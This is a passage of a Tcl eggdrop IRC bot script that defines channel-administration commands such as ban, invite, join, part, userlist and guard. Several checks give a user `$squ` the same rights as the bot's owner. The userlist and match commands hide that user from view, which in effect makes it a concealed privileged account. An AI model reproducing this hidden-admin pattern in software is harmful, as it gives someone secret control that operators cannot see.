  if {[matchattr $handle n] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK AdMiN FLAg" ; return 0 }
  if {[matchattr $handle m] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK MaStEr FLAg" ; return 0 }
  set bannick($handle) $hostmask ; putserv "KICK $chan $handle :2$reason" ; return 0
}
##mode
bind pub m `mode pub_mode
proc pub_mode {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthelp "NOTICE $nick :Usage: mode +/- ntspnmcilk" ; return 0 }
  putserv "mode $chan $rest"
}
## invite
bind pub m `invite pub_invite
proc pub_invite {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: invite <nick> <#channel>" }
  set who [lindex $rest 0] ; set tochan [lindex $rest 1]
  if {$tochan != ""} { if {![onchan $who $tochan]} { puthlp "INVITE $who :$tochan" ; puthlp "NOTICE $nick :InvItE $who To $tochan" ; return 0 } ; puthlp "NOTICE $nick :$who is already on the $tochan" }
  if {![onchan $who $chan]} { putsrv "INVITE $who :$chan" ; puthlp "NOTICE $nick :Invitation to $chan has been sent to $who" ; return 0 }
  puthlp "NOTICE $nick :$who is already on the channel"
}
## banlist
bind pub m `banlist pub_banlist
proc pub_banlist {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan] != 0} { set chan "#$chan" } }
  if {![validchan $chan]} { puthlp "NOTICE $nick :NoT IN cHaN $chan." ; return 0 }
  foreach x [chanbans $chan] { puthlp "NOTICE $nick :$x" }
  if {[chanbans $chan] == ""} { puthlp "NOTICE $nick :BaNLIsT $chan <n/a>" }
  return 0
}
## ban
bind pub m `b pub_ban
bind pub m `ban pub_ban
proc pub_ban {nick uhost hand channel rest} {
  global botnick notc
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: ban <nick/hostmask>" ; return 0 }
  set handle [lindex $rest 0]
  if {$handle == $botnick} { puthlp "NOTICE $nick :4!DeNiEd!, can't ban my self" ; return 0 }
  if {[matchattr $handle n]} { puthlp "NOTICE $nick :!DeNiEd!, cant ban Admin" ; return 0 }
  set hostmask [getchanhost $handle $channel]
  if {![onchan $handle $channel]} { set hostmask [lindex $rest 0] }
  if {$hostmask != "*!*@*"} { putserv "MODE $channel +b $hostmask" }
}
## unban 
bind pub m `unban pub_unban
proc pub_unban {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: unban <nick/hostmask> <#channel>" ; return 0 }
  if {[lindex $rest 1] != ""} { set chan [lindex $rest 1] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  set handle [lindex $rest 0]
  append userhost $handle "!*" [getchanhost $handle $chan]
  set hostmask [maskhost $userhost]
  if {![onchan $handle $chan]} { set hostmask [lindex $rest 0] }
  putserv "MODE $chan -kb 6request.unban $hostmask"
  puthlp "NOTICE $nick :UnBaN [unsix $hostmask] ON $chan"
}
## munbans
bind pub m `munbans pub_munbans
proc pub_munbans {nick uhost hand chan rest} {
  global notc botnick
  if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan] != 0} { set chan "#$chan" } }
  if {[chanbans $chan] == ""} { return 0 } ; set bans "" ; set i 0
  foreach x [chanbans $chan] { 
    if {$i < 5} { append bans " [lindex $x 0]" ; set i [incr i] } 
    if {$i == 5} { puthelp "MODE $chan -kbbbbbb 6clearing.ban.list $bans" ; set bans "" ; append bans " [lindex $x 0]" ; set i 0 } 
  }
  puthelp "MODE $chan -kbbbbbb 6clearing.ban.list $bans"
  if {![onchan $nick $chan]} { puthlp "NOTICE $nick :MuNBaNS \[$chan\]" }
  return 0
}
## channels
bind msg m channels msg_channels
proc msg_channels {nick hand uhost rest} { pub_channels $nick $uhost $hand "" $rest }
bind pub m `channels pub_channels
proc pub_channels {nick hand uhost channel rest} {
  global botnick notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} {
    if {[validchan [lindex $rest 0]]} {
      set x [lindex $rest 0]
      set chan ""
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x [chattr $cflag]" ; puthlp "NOTICE $nick :$chan"
    }
    return 0
  }
  set chan "Channels:"
  foreach x [channels] {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x"
  }
  puthlp "NOTICE $nick :$chan"
}
## userlist
bind msg m userlist msg_userlist
proc msg_userlist {nick hand uhost rest} { global notc ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } ; pub_userlist $nick $uhost $hand "" $rest }
bind pub m `userlist pub_userlist
proc pub_userlist {nick uhost hand chan rest} {
  global squ notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set akicklist " 4KIcKLIsT" ; foreach y [getuser "AKICK" HOSTS] { append akicklist " $y " } ; set users "UsERLIsT:"
  foreach x [userlist] { if {($x != "config") && ($x != "AKICK") && ($x != $squ) && ![matchattr $x A]} { if {[matchattr $x O]} { append users " 4$x " } else { append users " $x " } ; set flag [chattr $x] ; append users "($flag)" } }
##  append users " \[$akicklist\]"
  if {[getuser "config" XTRA "IPG"] != ""} { append users " IpguaRd [getuser "config" XTRA "IPG"]" }
  if {[string length $users] > 300} {
    set half [expr [string length $users]/3]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$ntc"
    set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
    puthlp "NOTICE $nick :$ntc"
    set ntc "..[string range $users [expr $half + 1 + $half] end]"
    puthlp "NOTICE $nick :$ntc"
    } elseif {[string length $users] > 200} {
    set half [expr [string length $users]/2]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$ntc"
    set ntc "..[string range $users [expr $half + 1] end]"
    puthlp "NOTICE $nick :$ntc"
  } else { puthlp "NOTICE $nick :$users" }
  return 0
}
## match
bind pub m `match pub_match
proc pub_match {nick uhost hand chan rest} {
  global squ notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest==""} { puthlp "NOTICE $nick :Usage: match <flags>" ; return 0 }
  set rest [string trim $rest +]
  if {[string length $rest] > 1} { puthlp "NOTICE $nick :Invalid option." ; return 0 }
  if {$rest!=""} {
    set rest "+[lindex $rest 0]"
    if {[userlist $rest]!=""} { regsub -all " " [userlist $rest] ", " users ; regsub -all $squ [userlist $rest] "" users ; puthlp "NOTICE $nick :Match \[$rest\]: $users" ; return 0 }
    if {[userlist $rest]==""} { puthlp "NOTICE $nick :No users with flags \[$rest\]" ; return 0 }
  }
}
## chaninfo
bind pub m `chaninfo pub_chaninfo
proc pub_chaninfo {nick uhost hand chan rest} {
  global notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  puthlp "NOTICE $nick :\[[string toupper [string trimleft $chan #]]\] [channel info $chan]"
}
## cycle
bind pub m `cycle pub_cycle
proc pub_cycle {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $rest 0]
  if {$rest==""} { if {![onchan $nick $chan]} { puthlp "NOTICE $nick :cYcLE $chan" } ; cycle $chan ; return 0
  } else { if {[string index $rest 0] != "#"} { set rest "#$rest" } ; if {[botonchan $rest]} { cycle $rest } }
}
proc cycle {chan} {
  global cyclem notc
  set cyclemsg [lindex $cyclem [rand [llength $cyclem]]]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![string match "*c*" [getchanmode $chan]]} { set text "6$cyclemsg) ($notc" } { set text $cyclemsg }
  putsrv "PART $chan :$text"
  if {[matchattr $cflag K]} { putsrv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]" } { putsrv "JOIN $chan" }
  if {[matchattr $cflag C]} { if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] } }
}
## resync
bind pub m `resync pub_resync
proc pub_resync {nick uhost hand channel rest} {
  global botnick rms notc
  if {[isutimer "resync$channel"]} { return 0 }
  utimer 30 [list putlog "resync$channel"]
  set rmsg [lindex $rms [rand [llength $rms]]]
  if {![string match "*k*" [getchanmode $channel]]} { putserv "mode $channel +v $botnick " } { putserv "mode $channel +v $botnick" }
}
## ignorelist
bind pub m `ignores pub_ignores
proc pub_ignores {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set iglist ""
  foreach x [ignorelist] { set iglister [lindex $x 0] ; set iglist "$iglist $iglister" }
  if {[ignorelist]==""} { puthlp "NOTICE $nick :No ignores." ; return 0 }
  regsub -all " " $iglist ", " iglist
  set iglist [string range $iglist 1 end]
  puthlp "NOTICE $nick :Currently ignoring:$iglist"
  return 0
}
## ignore/unignore
bind pub m `+ignore pub_+ignore
proc pub_+ignore {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $rest 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +ignore <hostmask>" ; return 0 }
  if {[isignore $rest]} { puthlp "NOTICE $nick :$rest is alreay set on ignore." ; return 0 }
  if {$rest == "*!*@*"} { puthlp "NOTICE $nick :4DeNiEd..!, Ilegal hostmask." ; return 0 } 
  set usenick [finduser $rest]
  if {$usenick != "*" && [matchattr $usenick f]} { puthlp "NOTICE $nick :4DeNiEd..!, canT IgNoREd FRIend UsER" ; return 0 }
  if {$rest != $nick} { newignore $rest $nick "*" 600 ; puthlp "NOTICE $nick :Ignoring $rest" 
  } else { puthlp "NOTICE $nick :4DeNiEd..!, Can't ignore your self." }
}
bind pub m `-ignore pub_-ignore
proc pub_-ignore {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set hostmask [lindex $rest 0]
  if {$hostmask == ""} { puthlp "NOTICE $nick :Usage: -ignore <hostmask>" ; return 0 }
  if {![isignore $hostmask]} { puthlp "NOTICE $nick :$hostmask is not on my ignore list." ; return 0 }
  if {[isignore $hostmask]} { killignore $hostmask ; puthlp "NOTICE $nick :No longer ignoring \002\[\002${hostmask}\002\]\002" ; saveuser }
}
## ver
bind pub m `ver pub_ver
proc pub_ver {nick uhost hand chan rest} {
  global vern notc version vern tcl_version
  if {[catch {exec uname -s} machine]} { set machine [unames] } ; if {[catch {exec uname -r} kernel]} { set kernel [unamer] }
  puthlp "PRIVMSG $chan :running on $machine $kernel powered by eggdrop[lindex $version 0] with Tcl$tcl_version"
  return 0
}
bind pub m `logoaway pub_logoaway
proc pub_logoaway {nick uhost hand chan rest} {
   global awaybanner notc
   if {[info exists awaybanner]} { puthelp "PRIVMSG $chan :$awaybanner" } { puthelp "PRIVMSG $chan :$notc" } ; return 0
}
## owner command 
## Join
bind msg n join msg_join
proc msg_join {nick uhost hand rest} {
  global botnick joinme nwo notc owner squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, YoU aRe nOt mY ReAL OwNER" ; return 0 }
  if {$chantarget == ""} { puthlp "NOTICE $nick :Usage: join <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  if {[validchan $chantarget]} { puthlp "NOTICE $nick :$chantarget already in channel list" ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :To MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chantarget
  catch { channel set $chantarget -split +echox +trojan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chantarget :[lindex $rest 1]" } ; return 0
}
bind pub n `join pub_join
proc pub_join {nick uhost hand chan rest} {
  global botnick joinme nwo notc owner squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, YoU aRe NoT mY ReAL OwNER" ; return 0 }
  set chan [lindex $rest 0]
  if {[string first # $chan] != 0} { set chan "#$chan" }
  if {$chan=="#"} { puthlp "NOTICE $nick :Usage: join <#channel>" ; return 0 }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chan]} { puthlp "NOTICE $nick :$x ReADY!" ; return 0 } }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :To MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chan
  catch { channel set $chan -split +echox +trojan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chan :[lindex $rest 1]" }
}
proc total_channel {} { global notc ; set total_chan 0 ; foreach x [channels] { incr total_chan } ; if {$total_chan > 9} { return 0 } ; return 1 }
## part msg
bind msg n part msg_part
proc msg_part {nick uhost hand rest} {
  global botnick joinme notc squ partm
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set partmsg [lindex $partm [rand [llength $partm]]]
  set chantarget [lindex $rest 0]
  set part_msg [lrange $rest 1 end]
  if {$chantarget == ""} { puthlp "NOTICE $nick :Usage: part <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      if {[string match "*+secret*" [channel info $x]]} { puthlp "NOTICE $nick :I can't part $x 4pRoTecTEd..!" ; return 0 }
      if {![onchan $nick $x]} { puthlp "NOTICE $nick :PaRT $x" }
      if {$part_msg != ""} { putsrv "PART $x :(6$part_msg)" } { putsrv "PART $x :(6$partmsg)" }
      channel remove $x ; savechan ; return 0
  } }
  return 0
}
bind pub n `part pub_part
bind pub n `-chan pub_part
proc pub_part {nick uhost hand chan rest} {
  global notc squ quick partm
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set curtime [ctime [unixtime]]
  set partmsg [lindex $partm [rand [llength $partm]]]
  set part_msg [lrange $rest 1 end]
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+secret*" [channel info $chan]]} { puthlp "NOTICE $nick :$chan 4PRoTecTEd..!" ; return 0 }
  if {![onchan $nick $chan]} { putsrv "NOTICE $nick :PaRT $chan" }
  if {$part_msg != ""} { if {$quick == "1"} { putqck "PART $chan :(6$part_msg)" } { putsrv "PART $chan :(6$part_msg)" } } { if {$quick == "1"} { putqck "PART $chan :(6$partmsg)" } { putsrv "PART $chan :(6$partmsg)" } }
  channel remove $chan ; savechan ; return 0
}
## +chan
bind pub n `+chan pub_+chan
proc pub_+chan {nick uhost hand chan rest} {
  global botnick joinme owner notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :4!BLoCkEd!" ; return 0 }
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, oNLy ReAL OwNER can ADD Channel" ; return 0 }
  set chan [lindex $rest 0]
  set opt [lindex $rest 1]
  if {[string first # $chan]!=0} { set chan "#$chan" }
  if {$chan=="#"} { puthlp "NOTICE $nick :Usage: +chan <#channel>" ; return 0 }
  if {[validchan $chan]} { puthlp "NOTICE $nick :$chan is already on channels" ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :TO MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chan
  if {$opt != "" && [string tolower $opt] == "+nopart"} { 
    catch { channel set $chan -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  } else { catch { channel set $chan -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chan :[lindex $rest 1]" }
}
bind msg n +chan msg_+chan
proc msg_+chan {nick uhost hand rest} {
  global botnick joinme nwo notc owner squ
  set chantarget [lindex $rest 0]
  set opt [lindex $rest 1]
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :4!BLoCkEd!" ; return 0 }
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, oNLy ReAL OwNER can ADD Channel" ; return 0 }
  if {$chantarget == ""} { puthlp "NOTICE $nick :Usage: +chan <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  if {[validchan $chantarget]} { puthlp "NOTICE $nick :$chantarget is already on channels list." ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :OnLY ReAL OwNeR can ADD ChaNneL ..!" ; return 0 }
  set joinme $nick ; channel add $chantarget
  if {$opt != "" && [string tolower $opt] == "+nopart"} { catch { channel set $chantarget -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 3:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } 
  } else { catch { channel set $chantarget -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chantarget :[lindex $rest 1]" } ; return 0
}
## status publish
bind pub n `+status pub_+status
bind msg n `+status pub_+status
proc pub_+status {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } } ; if {![validchan $chan]} { return 0 }
  if {[string match "*+shared*" [channel info $chan]]} { puthlp "NOTICE $nick :STaTUS $chan \[9ON\]" ; return 0 }
  catch { channel set $chan +shared } ; puthlp "NOTICE $nick :STaTuS $chan \[9ON\]" ; savechan
}
bind pub n `-status pub_-status
bind msg n `-status pub_-status
proc pub_-status {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } } ; if {![validchan $chan]} { return 0 }
  if {[string match "*-shared*" [channel info $chan]]} { puthlp "NOTICE $nick :STaTuS $chan IS \[4OFF\]" ; return 0 }
  catch { channel set $chan -shared } ; puthlp "NOTICE $nick :STaTuS $chan \[4OFF\]" ; savechan ; return 0
}
## enforceban
bind msg Z +enforceban pub_+enforceban
bind pub Z `+enforceban pub_+enforceban
proc pub_+enforceban {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag +E
  puthlp "NOTICE $nick :enforceban $chan \[9ON\]" ; saveuser
}
bind msg Z -enforceban pub_-enforceban
bind pub Z `-enforceban pub_-enforceban
proc pub_-enforceban {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } ; set cflag "c$chan" ; set cflag [string range $cflag 0 8] 
  chattr $cflag -E ; puthlp "NOTICE $nick :enforceban $chan \[4OFF\]" ; saveuser
}
## autovoice
bind pub n `+autovoice pub_+autovoice
proc pub_+autovoice {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } ; set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +AuTovoIcE <secs>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  chattr $cflag +V ; setuser $cflag XTRA "VC" $rest
  puthlp "NOTICE $nick :AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
  saveuser ; pub_mvoice $nick $uhost $hand $chan ""
}
bind pub n `-autovoice pub_-autovoice
proc pub_-autovoice {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag -V ; setuser $cflag XTRA "VC" ""
  puthlp "NOTICE $nick :AuTovoIcE $chan \[4OFF\]" ; saveuser
  foreach x [utimers] { if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] } }
}
## seen
bind pub n `+seen pub_+seen
proc pub_+seen {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {![string match "*seen*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x +seen } } ; savechan ; puthlp "NOTICE $nick :ALL SEEN cHaNNeL \[9ON\]" ; seen ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+seen*" [channel info $chan]]} { puthlp "NOTICE $nick :SEEN $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +seen } ; puthlp "NOTICE $nick :SEEN $chan \[9ON\]" ; savechan ; seen
}
bind pub n `-seen pub_-seen
proc pub_-seen {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {![string match "*seen*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x -seen } } ; savechan ; puthlp "NOTICE $nick :ALL SEEN cHaNNeL \[4OFF\]" ; seen ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-seen*" [channel info $chan]]} { puthlp "NOTICE $nick :SEEN $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -seen } ; puthlp "NOTICE $nick :SEEN $chan \[4OFF\]" ; savechan ; seen ; return 0
}
## guard
bind pub n `+guard pub_+guard
proc pub_+guard {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] {
      catch { channel set $x +echox +trojan +greet flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 250
      setuser $cflag XTRA "RPT" 5
      setuser $cflag XTRA "CAPS" 80
    }
    savechan ; puthlp "NOTICE $nick :ALL GuaRd CHaNNeL \[9ON\]" ; return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 250
  setuser $cflag XTRA "RPT" 5
  setuser $cflag XTRA "CAPS" 80
  if {[string match "*+greet*" [channel info $chan]]} { puthlp "NOTICE $nick :GuARd $chan \[9ON\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  catch { channel set $chan +echox +trojan +greet flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 3:6 flood-ctcp 2:10 flood-nick 3:30 }
  puthlp "NOTICE $nick :GuARD $chan \[9ON\]" ; savechan
}
bind pub n `-guard pub_-guard
proc pub_-guard {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] {
      catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
      set cflag "c$x" ; set cflag [string range $cflag 0 8] ; chattr $cflag "-hpJSPTRUED"
    }
    savechan ; puthlp "NOTICE $nick :ALL GuaRd cHaN \[4OFF\]" ; return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hpJSPTRUED"
  if {[string match "*-greet*" [channel info $chan]]} { puthlp "NOTICE $nick :GuARD $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
  puthlp "NOTICE $nick :GuARD $chan \[4OFF\]" ; savechan ; return 0
}
## +/-master
bind pub n `+master pub_+master
proc pub_+master {nick uhost hand channel param} {
  global botnick squ notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +master <nick>" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLoCkEd!" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :Add \[$rest\] MasTeR LIsT." ; return 0 }
  if {[matchattr $rest n]} { puthlp "NOTICE $nick :4DeNiEd..!, $rest is ADmIN level." ; return 0 }
  if {[matchattr $rest m]} { puthlp "NOTICE $nick :4DeNiEd..!, $rest is already exist." ; return 0 }
